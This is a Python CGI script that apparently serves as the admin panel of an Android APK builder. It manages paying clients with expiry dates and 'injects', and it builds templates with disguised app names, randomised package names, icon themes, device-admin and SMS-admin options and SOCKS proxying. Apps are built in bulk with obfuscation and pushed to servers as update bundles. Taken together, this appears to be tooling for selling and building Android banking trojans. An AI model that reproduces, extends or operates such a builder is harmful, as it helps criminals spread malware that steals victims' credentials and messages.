#!/usr/local/bin/python3
import os, sys
from helper_class import *
from app_class import App
os.dup2(1, 2)

# CONSOLE SET TPL:  ./start.py obfuscate 104   -- tpl_id
# CONSOLE REBUILD:  "www ./start.py rebuild"
# DOWNLOAD BACKEND BACKUP:  "www ./start.py get_backend_backup"

from config import *

app = App()
form = cgi.FieldStorage()
app.init(form, PATH, PATH_BUILDER, UPLOAD_TO, db, BUILDER_BASIC_AUTH)

if len(sys.argv) > 1:
	if sys.argv[1] == 'obfuscate':
		app.set_template(sys.argv[2], obfuscate=True)
		exit()
	elif sys.argv[1] == 'rebuild':
		app.rebuild_active()
		print("REBUILD DONE")
		exit()
	elif sys.argv[1] == 'get_backend_backup':
		app.get_backup('backs/backend_{}.zip'.format(hlp.human_date(format_d="%d.%m.%y")))
		exit()
		
sys.stdout.buffer.write(b'Content-type: text/html;charset=utf-8\n\n')

import cgitb
cgitb.enable()
#~ form = hlp.cgi_init(True)


if form.getvalue('check_servers', False):
	app.show_tpl('header')
	app.check_servers()
	app.show_tpl('footer')
	exit()

if form.getvalue('access_list', False):
	app.show_tpl('header')
	print(app.show_access_list())
	app.show_tpl('footer')
	exit()

tpl = {}
action = form.getvalue('action', '')

## INIT MAIN 
cid = form.getvalue('client_id', False) # selected client
if isinstance(cid, list):
	cid = cid[-1]
	
tpl_id = form.getvalue('tpl_id', 0) # selected template

if not cid:
	cid = app.db.execute('select id from clients where status="active" order by id desc limit 1')[0][0]
	
if not tpl_id:
	try:
		tpl_id = app.db.execute('select id from templates where client_id={} order by id desc limit 1'.format(cid))[0][0]
	except:
		tpl_id = 0
		
tpl['client_id'] = cid
tpl['tpl_id'] = tpl_id

output = app.show_access_list(cid)

## ACTION 

if action == 'set_tpl':
	
	html = app.git_reset()

	if tpl_id == 0:
		tpl['clients'] = app.get_clients_select(cid)
		tpl['tpls'] = app.get_tpl_select(cid, tpl_id)
		output = '<b style="color: red">No template found</b>'
	else:
		api = app.get_template_api(tpl_id)
		apis = [v.strip() for v in api.split(',') if api.strip()]
		api = apis[0]
	
		html += app.set_template(tpl_id, api=api)
		output = html
	
elif action == 'set_tpl_obfuscate_no_reset':

	if tpl_id == 0:
		tpl['clients'] = app.get_clients_select(cid)
		tpl['tpls'] = app.get_tpl_select(cid, tpl_id)
		output = '<b style="color: red">No template found</b>'
	else:
		html = ''

		api = app.get_template_api(tpl_id)
		apis = [v.strip() for v in api.split(',') if api.strip()]
		api = apis[0]
		
		html += app.set_template(tpl_id, obfuscate=True, api=api)
		output = html
	
elif action == 'import_client':
	
	if form.getvalue('new_client', ''):
		data = form.getvalue('new_client', '').strip()
		period = form.getvalue('period', '').strip()
		domains = form.getvalue('domains', '').strip()
		
		#~ cc_on = form.getvalue('cc_on', '').strip()
		#~ injects = form.getvalue('injects', '').strip()
		#~ minimize_apps = form.getvalue('minimize_apps', '').strip()
		
		res = app.import_client(data, period, domains)
		if res is True:
			
			data2 = {}
			data2['name'] = [v.split(':', 1)[-1].strip() for v in data.split('\n') if v.startswith('Client:')][0]
			
			app.add_blank_tpl(data2)
			output = '<br /><b>Done</b>'
		else:
			output = '<span style="color: red">DB error: {}</span>'.format(res)
		
	else:
		output = hlp.f_read('tpls/import_client.html')
	
elif action == 'set_tpl_obfuscate':
	
	html = app.git_reset()
	if tpl_id == 0:
		output = '<b style="color: red">No template found</b>'
	else:
		api = app.get_template_api(tpl_id)
		apis = [v.strip() for v in api.split(',') if api.strip()]
		api = apis[0]
		
		html += app.set_template(tpl_id, obfuscate=True, api=api)
		output = html
	
elif action == 'add_day_to_active':
	app.add_day_to_active()
	output = "1 day added to all active clients"

elif action == 'delete_old_apk':
	output = app.delete_old_apk()

elif action == 'all_themes':

	tpl['message'] = ''
	
	themes = form.getlist('themes')
	if themes:
		tpl['message'] = '<span style="color: blue; background-color: white; padding: 10px; border-radius: 5px">Added</span>'
		app.add_themes(themes)

	#~ tpl['tpl_select'] = app.get_all_tpl_select()
	#~ tpl['icon_select'] = app.get_icon_select()
	tpl['themes_list'] = app.all_themes_list()
	
	tpl['output'] = app.get_form_add_themes()
	
	app.show_tpl('header')
	app.show_tpl('mass_add_themes', tpl)
	app.show_tpl('footer')
	exit()
	
elif action == 'block_list':

	tpl['message'] = ''
	
	block_apps = form.getvalue('block_apps', False)
	if block_apps:
		tpl['message'] = '<span style="color: blue; background-color: white; padding: 10px; border-radius: 5px">Saved</span>'
		app.save_block_apps(block_apps)

	tpl['output'] = app.get_block_apps()
	tpl['total'] = len([v for v in tpl['output'].split('\n') if v.strip()])
	
	app.show_tpl('header')
	app.show_tpl('edit_block_apps', tpl)
	app.show_tpl('footer')
	exit()

elif action == 'build':
	html = app.git_reset()

	api = app.get_template_api(tpl_id)
	apis = [v.strip() for v in api.split(',') if api.strip()]
	for api in apis:
		html += app.set_template(tpl_id, obfuscate=True, api=api)
		res = app.build(tpl_id, api_custom=api)
		app.git_reset()
		sys.stdout.buffer.write(res.encode())
		sys.stdout.flush()
		html += res
			
	output = html

elif action == 'rebuild_client':
	
	tpls = app.get_client_tpl(cid)
	if not tpls:
		print('CLIENT DOES NOT HAVE THEMES')
		exit()
		
	path = app.root + 'apks/update.zip'
	hlp.f_delete(path)
	html = 'Start mass build & upload for {}\n'.format(', '.join( [str(t) for t in tpls] ))
	
	sys.stdout.buffer.write(b'<!--\n')
	sys.stdout.flush()
	app.final_apks = []
	for tpl_id in tpls:
		html += '<h1 style:"color: black;">Template #{}</h1>'.format(tpl_id)
		
		api = app.get_template_api(tpl_id)
		apis = [v.strip() for v in api.split(',') if api.strip()]
		for api in apis:
			html += app.set_template(tpl_id, obfuscate=True, api=api)
			res = app.build(tpl_id, api_custom=api)
			app.git_reset()
			sys.stdout.buffer.write(res.encode())
			sys.stdout.flush()
			html += res
		
	app.git_reset()

	sys.stdout.buffer.write(b'uploading file to server<br>\n')
	sys.stdout.flush()
	
	
	html += app.zip(path, app.final_apks)
	html += app.delete_apks(app.final_apks)
	html += app.upload_update(path)
	sys.stdout.buffer.write(b'-->\n')
	sys.stdout.flush()
	
	output = html

elif action == 'mass_build':
	
	tpls = form.getlist('tpls')

	# build and upload to clients
	upload = form.getvalue('build', False)
	if upload == 'build_upload':

		if tpls:
			path = app.root + 'apks/update.zip'
			hlp.f_delete(path)
			html = 'Start mass build & upload for {}\n'.format(', '.join(tpls))
			sys.stdout.buffer.write(b'<!--\n')
			sys.stdout.flush()
			app.final_apks = []
			for tpl_id in tpls:
				html += '<h1 style:"color: black;">Template #{}</h1>'.format(tpl_id)

				api = app.get_template_api(tpl_id)
				apis = [v.strip() for v in api.split(',') if api.strip()]
				for api in apis:
					html += app.set_template(tpl_id, obfuscate=True, api=api)
					res = app.build(tpl_id, api_custom=api)
					app.git_reset()
					sys.stdout.buffer.write(res.encode())
					sys.stdout.flush()
					html += res
				
			app.git_reset()

			sys.stdout.buffer.write(b'uploading file to server<br>\n')
			sys.stdout.flush()

			html += app.zip(path, app.final_apks)
			html += app.delete_apks(app.final_apks)
			html += app.upload_update(path)
			sys.stdout.buffer.write(b'-->\n')
			sys.stdout.flush()
			html += 'In case "update.zip not found" try to reset git manually, check perms and remove app/build/* '
		
		#~ exit()
	else:
		# simple build/zip
		if tpls:
			html = 'Start mass build for {}\n'.format(', '.join(tpls))
			app.final_apks = []
			for tpl_id in tpls:
				html += '<h1>Template #{}</h1>'.format(tpl_id)
				
				api = app.get_template_api(tpl_id)
				apis = [v.strip() for v in api.split(',') if api.strip()]
				for api in apis:
					html += app.set_template(tpl_id, obfuscate=True, api=api)
					res = app.build(tpl_id, api_custom=api)
					app.git_reset()
					sys.stdout.buffer.write(res.encode())
					sys.stdout.flush()
					html += res
			
			if form.getvalue('zip_to'):
				zip_name = form.getvalue('zip_name')
				html += app.zip(zip_name, app.final_apks)
				
				if form.getvalue('delete_apks'):
					html += app.delete_apks(app.final_apks)
			
		else:
			
			tpl['output'] = app.get_tpls_select()
			
			app.show_tpl('header')
			app.show_tpl('mass_build', tpl)
			app.show_tpl('footer')
			exit()
		
	output = html
	
elif action == 'add_client':
	
	tpl['message'] = ''
	
	if form.getvalue('save_form'):
		fields = ['name','status','folder','admin_access','basic_access','notes','injects','domains','cc_on','paid_until', 'panel_folder', 'stats_folder']
		data = {}
		for f in fields:
			data[f] = form.getvalue(f, '')
			
		tpl['message'] = '<span style="color: blue">{}</span>'.format(app.add_client(data))
		app.add_blank_tpl(data)

	tpl['status'] = 'active'
	tpl['cc_on'] = ''
	
	app.show_tpl('header')
	app.show_tpl('add_client', tpl)
	app.show_tpl('footer')
	exit()
	
elif action == 'edit_client':
	
	tpl['message'] = ''
	
	if form.getvalue('save_form'):
		fields = ['name','status','folder','admin_access','basic_access','notes','injects','domains','cc_on', 'paid_until', 'panel_folder', 'stats_folder']
		data = {}
		for f in fields:
			data[f] = form.getvalue(f, '')
		
		data['client_id'] = tpl['client_id']
		
		tpl['message'] = '<span style="color: blue">{}</span>'.format(app.save_client(data))
		
	tpl.update(app.get_client_info(cid))
	info, admin_url, stats_url = app.get_client_access(cid)
	tpl['access_info'] = info
	tpl['access_admin_url'] = admin_url
	tpl['access_stats_url'] = stats_url
	app.show_tpl('header')
	app.show_tpl('edit_client', tpl)
	app.show_tpl('footer')
	exit()
	
elif action == 'git_reset':
	output = app.git_reset()
	
elif action == 'delete_tpl':
	output = app.delete_tpl(tpl['tpl_id'])

elif action == 'add_tpl':
	
	tpl['message'] = ''
	tpl['icon_select'] = app.get_icon_select()
	tpl['client_select'] = app.get_clients_select(cid)
	
	if form.getvalue('save_form'):
		fields = ['client_id', 'app_name', 'package_name', 'api', 'injects', 'socks_enabled', 'device_admin_label', 'device_admin_descr']
		data = {}
		for f in fields:
			data[f] = form.getvalue(f, '')
			if isinstance(data[f], list):
				data[f] = data[f][-1]
		
		data['sms_admin_required'] = form.getvalue('sms_admin_mode', 0)
		data['socks_enabled'] = 1 if form.getvalue('socks_enabled', 0) else 0

		if form.getvalue('new_icon', False):
			new_icon = hlp.f_write_cgi(form['new_icon'], hlp.pwd() + '/tmp/')
			theme = form.getvalue('icon_theme_name')
			app.add_icon(new_icon, theme)
		else:
			theme = form.getvalue('icon_set', '')

		data['icon_set'] = theme
		res = app.clone_tpl(data, 'Added success')
		tpl['message'] = '<span style="color: blue">{}</span>'.format(res)

		tpl.update(app.get_tpl_info())
	
		tpl['icon_select'] = app.get_icon_select(tpl['icon_set'])
		tpl['icon_first'] = 'flash'
		tpl['pkg_name_random'] = 'com.' + hlp.password(15, src='eng')
		tpl['client_select'] = app.get_clients_select(tpl['client_id'])

	app.show_tpl('header')
	tpl['sms_admin_mode'] = app.get_sms_admin_mode_list(0)
	app.show_tpl('add_tpl', tpl)
	app.show_tpl('footer')
	exit()
	
elif action == 'put_dump':
	
	if form.getvalue('fileToUpload'):
		name = hlp.f_write_cgi(form['fileToUpload'], "tmp/")
		output = " {} uploaded success".format(name)
		
		res = hlp.execute('gunzip {}'.format(name), returnFull=True)
		if not res:
			res = 'OK'
		output += "<br />Gunzipped: {}".format(res)
		
		app.db.execute('rm -rf clients')
		app.db.execute('rm -rf replaces')
		app.db.execute('rm -rf settings')
		app.db.execute('rm -rf templates')
		
		dump_path = hlp.pwd() +'/'+ name.replace('.gz', '')
		
		cmd = 'mysql -u{} -p{} {} < {}'.format(db['user'], 'PASSWORD', db['db_name'], dump_path)
		cmd += '; rm {}'.format(dump_path)
		#~ res = hlp.exec_background(cmd)
		#~ if not res:
			#~ res = 'OK'
			
		#~ output += "<br />mysql import: {}".format(res)
		output += 'Now do: <input type="text" style="width: 100%" value="{}" onclick="this.select()" />'.format(cmd)
		
	else:
		output = """
	<center><b>Select builder.sql.gz dump file</b>
	<form method='post' id='upload_form' enctype='multipart/form-data'>
	<input onchange='document.getElementById("upload_form").submit()' type='file' name='fileToUpload' />
	</form>
	</center>
	"""
	
	
elif action == 'get_dump_back':
	hlp.execute('rm -f builder.sql.gz')
	output = 'dump has been deleted'
	
elif action == 'get_dump':

	cmd = 'mysqldump -u{} -p{} {} > tmp/builder.sql 2>&1'.format(db['user'], db['password'].replace('$', '\\$'), db['db_name'])
	
	res = hlp.execute(cmd, returnFull=True)
	cmd = 'gzip -9 tmp/builder.sql'
	res = hlp.execute(cmd, returnFull=True)
	cmd = 'mv tmp/builder.sql.gz .'
	res = hlp.execute(cmd, returnFull=True)
	#~ print(res)
	print('''<center>
		<a href="builder.sql.gz" style="font-family: Verdana; font-size: 16pt; display: block; margin-top: 100px">Download db dump ({})</a><br />
		<a href="?action=get_dump_back">&larr; Back</a>
	</center>'''.format(hlp.size('builder.sql.gz', human=True)))
	exit()
	
elif action == 'edit_tpl':
	
	tpl['message'] = ''
	
	if form.getvalue('save_form'):
		fields = ['client_id', 'icon_set', 'app_name', 'package_name', 'api', 'injects', 'socks_enabled', 'device_admin_label', 'device_admin_descr']
		data = {}
		for f in fields:
			data[f] = form.getvalue(f, '')
		data['sms_admin_required'] = form.getvalue('sms_admin_mode', 0) # 0 - off, 1 - old, 2 - new
		data['socks_enabled'] = 1 if form.getvalue('socks_enabled', 0) else 0
		data['tpl_id'] = tpl['tpl_id']
		
		if form.getvalue('submethod') == 'clone':
			res = app.clone_tpl(data)
			tpl_id = app.get_last_template_id() # switch to created tpl
		else:
			res = app.save_tpl(data)
			
		tpl['message'] = '<span style="color: blue">{}</span>'.format(res)

	tpl.update(app.get_tpl_info(tpl_id))
	
	tpl['icon_select'] = app.get_icon_select(tpl['icon_set'])
	#~ if tpl['icon_set']:
	tpl['icon_first'] = tpl['icon_set']
	#~ else:
		#~ tpl['icon_first'] = app.get_first_icon()
	
	tpl['client_select'] = app.get_clients_select(tpl['client_id'])
	tpl['sms_admin_mode'] = app.get_sms_admin_mode_list(tpl['sms_admin_required'])
	tpl['socks_enabled'] = 'checked' if tpl['socks_enabled'] else ''
	
	app.show_tpl('header')
	app.show_tpl('edit_tpl', tpl)
	app.show_tpl('footer')
	exit()

tpl['clients'] = app.get_clients_select(cid)
tpl['tpls'] = app.get_tpl_select(cid, tpl_id)
tpl['output'] = output

app.show_tpl('header')
app.show_tpl('index', tpl)
app.show_tpl('footer')









